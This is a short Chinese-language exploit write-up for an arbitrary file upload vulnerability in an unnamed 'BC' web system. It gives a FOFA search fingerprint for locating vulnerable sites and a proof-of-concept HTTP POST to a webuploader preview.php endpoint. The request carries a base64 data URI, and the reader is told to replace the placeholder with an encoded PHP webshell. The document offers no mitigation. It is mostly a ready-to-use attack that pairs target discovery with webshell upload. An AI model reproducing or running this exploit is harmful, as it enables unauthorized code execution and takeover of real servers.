**漏洞描述**

某BC任意文件上传漏洞

**fofa搜索语句**

body="main.e5ee9b2df05fc2d310734b11cc8c911e.css"

**影响版本**

部分版本

**漏洞复现**

POC：

```yaml
POST /statics/admin/webuploader/0.1.5/server/preview.php HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Dnt: 1
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
If-Modified-Since: Mon, 05 Sep 2022 01:19:50 GMT
If-None-Match: "63154eb6-273"
Te: trailers
Content-Type: application/x-www-form-urlencoded
Content-Length: 746

data:image/php;base64,此处替换PHP马的base64编码
```

将PHP马base64编码后替换到“此处替换PHP马的base64编码” 即可